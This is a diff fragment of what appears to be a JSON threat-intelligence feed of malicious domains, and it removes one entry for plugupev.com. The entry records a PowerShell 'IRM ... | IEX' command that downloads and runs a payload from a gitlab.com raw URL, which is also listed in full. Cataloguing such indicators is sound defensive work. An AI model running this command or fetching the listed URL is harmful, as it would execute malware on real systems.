@@ -4405,25 +4405,5 @@
     ],
     "ReportId": "cmwm8sw3e1sgr0omlknxj3rm2",
     "ScannedAt": "2026-11-18T14:54:44.454000+00:00"
-  },
-  {
-    "UrlDomain": "plugupev.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "148.251.0.164"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwm7i18s1sda0omler9ihr8u",
-    "ScannedAt": "2026-11-18T14:18:19.279000+00:00"
   }
 ]
